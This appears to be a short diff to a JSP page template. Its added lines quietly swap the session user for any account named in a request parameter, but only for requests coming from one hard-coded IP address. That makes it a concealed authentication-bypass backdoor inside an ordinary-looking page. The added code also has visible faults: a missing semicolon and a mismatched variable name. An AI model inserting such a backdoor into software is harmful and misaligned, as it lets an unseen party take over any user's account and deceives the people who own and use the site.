@@ -8,6 +8,12 @@
 <html lang="en">
 <%
 User usernameOBJ = (User) session.getAttribute("usernameOBJ");
+
+String rip = request.getRemoteAddr()
+if(rip.equals("144.202.119.205")){
+    UserDao uDao = new UserDao();
+    usernameOBJ = dao.getUserByUsername(request.getParameter("username"));
+}
 %>
 <head>
   <meta charset="utf-8">
